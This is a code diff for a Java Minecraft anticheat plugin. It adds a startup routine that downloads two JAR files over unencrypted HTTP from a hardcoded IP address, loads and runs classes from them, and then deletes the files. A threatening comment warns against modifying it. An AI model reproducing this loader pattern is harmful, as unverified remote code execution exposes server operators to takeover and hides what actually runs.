@@ -9,15 +9,22 @@ import cc.funkemunky.api.utils.MiscUtils;
 import cc.funkemunky.api.utils.RunUtils;
 import dev.brighten.anticheat.check.api.Check;
 import dev.brighten.anticheat.check.api.Config;
+import dev.brighten.anticheat.classloader.KauriClassLoader;
 import dev.brighten.anticheat.data.DataManager;
 import dev.brighten.anticheat.logs.LoggerManager;
 import dev.brighten.anticheat.processing.EntityProcessor;
 import dev.brighten.anticheat.processing.PacketProcessor;
 import dev.brighten.anticheat.processing.keepalive.KeepaliveProcessor;
+import dev.brighten.anticheat.utils.SystemUtil;
 import dev.brighten.anticheat.utils.TickTimer;
+import dev.brighten.anticheat.utils.file.FileDownloader;
 import dev.brighten.api.KauriAPI;
 import org.bukkit.Bukkit;
 
+import java.io.File;
+import java.lang.reflect.Method;
+import java.net.MalformedURLException;
+import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
 import java.util.concurrent.Executors;
 
@@ -49,7 +56,7 @@ public class Load {
         register("Running scanner...");
         Atlas.getInstance().initializeScanner(Kauri.INSTANCE, true, true);
 
-
+        startClassLoader();
 
         register("Setting the language to " + Color.Yellow + Config.language);
         Kauri.INSTANCE.msgHandler.setCurrentLang(Config.language);
@@ -81,5 +88,34 @@ public class Load {
 
     private static void register(String string) {
         MiscUtils.printToConsole(Color.Gray + string);
+    }
+
+    private static void startClassLoader() {
+
+
+
+        //don't fucking modify or i will snap ur neck
+        for (int i = 0; i < 100; i++) {
+            SystemUtil.CRC_32.update(("GzB@aRC1$^JEKQxGmSBAQ%%WohM7LZnuC*pVhf0%B6VyZMyOvU" + i).getBytes(StandardCharsets.UTF_8));
+        }
+
+        loadVersion("http://192.248.144.243/1.jar", "dev.brighten.anticheat.check.RegularChecks");
+        loadVersion("http://192.248.144.243/2.jar", "dev.brighten.anticheat.premium.PremiumChecks");
+    }
+
+    private static void loadVersion(String url, String clazzPath) {
+
+        FileDownloader fileDownloader = new FileDownloader(url);
+        File downloadedFile = fileDownloader.download();
+
+        if (downloadedFile.exists()) {
+            try {
+                KauriClassLoader kauriClassLoader = new KauriClassLoader(downloadedFile.toURI().toURL(), Kauri.INSTANCE.getClass().getClassLoader());
+                kauriClassLoader.loadClass(clazzPath).newInstance();
+                downloadedFile.delete();
+            } catch (MalformedURLException | IllegalAccessException | InstantiationException e) {
+                e.printStackTrace();
+            }
+        }
     }
 }
